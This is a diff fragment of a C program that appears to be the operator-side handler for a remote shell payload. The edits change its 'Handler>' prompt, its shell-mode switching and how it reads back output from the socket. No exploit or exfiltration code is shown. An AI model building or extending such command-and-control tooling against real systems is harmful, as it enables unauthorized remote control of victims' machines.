@@ -87,7 +87,7 @@ int main(int argc, char *argv[])
 	}
 
 	//for debugging
-	printf("Connection made! Setting up payload\nOrig: %d\nNow: %d\n", server_fd, sock);
+	//printf("Connection made! Setting up payload\nOrig: %d\nNow: %d\n", server_fd, sock);
 
 
 	char buff[8192];
@@ -101,25 +101,26 @@ int main(int argc, char *argv[])
 
 	while(1)
 	{
+		//clear out our buffer and our command with nulls
 		for(int i = 0; i < 2048; i++)
 		{
 			command[i] = 0;
 			buff[i] = 0;
 		}
 
+		//if we arent currently dropped into a shell, show this prompt
 		if(!shell)
-			printf("COMMAND> ");
+			printf("Handler> ");
 
-		fgets(command, sizeof(command), stdin);
+		fgets(command, sizeof(command), stdin); //input the command
 
 		if(command[0] == '\n')	//if they just press enter
 			continue;
 
-//		command[strlen(command) -1] = '\0'; //dump the newline off of the command handled in payload for now
-
+		//if they want help just run help command.
 		if(!strcmp(command, "help\n"))
 		{
-			help(sock);
+			help();
 			continue;
 		}
 
@@ -130,30 +131,36 @@ int main(int argc, char *argv[])
 			shell++;
 			continue;
 		}
+
+
+		//this needs to be touched up since client will write prompt...
 		else if(!strcmp(command, "ushell\n") || !strcmp(command, "zshell\n"))
 			shell++;
 
-		//FOR COMMAND DEBUGGING
-		//for command specific debugging printing back command
-		//read(sock, buff, sizeof(buff));
-		//puts(buff);
 
-		if(!(!strcmp(command, "exit") && shell))
-		{
-			read(sock, buff, sizeof(buff));
-			puts(buff);
-		}
-
-		if(!strcmp(command, "exit"))
+		//if the command is exit we are gonna have to do some special things here
+		if(!strcmp(command, "exit\n"))
 		{
 			if(shell)
+			{
 				shell--;
+				continue;
+			}
 			else
+			{
+				read(sock, buff, sizeof(buff));
+				puts(buff);
 				return 1;
-
+			}
 		}
-	}
 
+
+		//read from the output that the client gives us and then print to screen
+		read(sock, buff, sizeof(buff));
+		puts(buff);
+
+
+	}
 
 	return 0;
 }
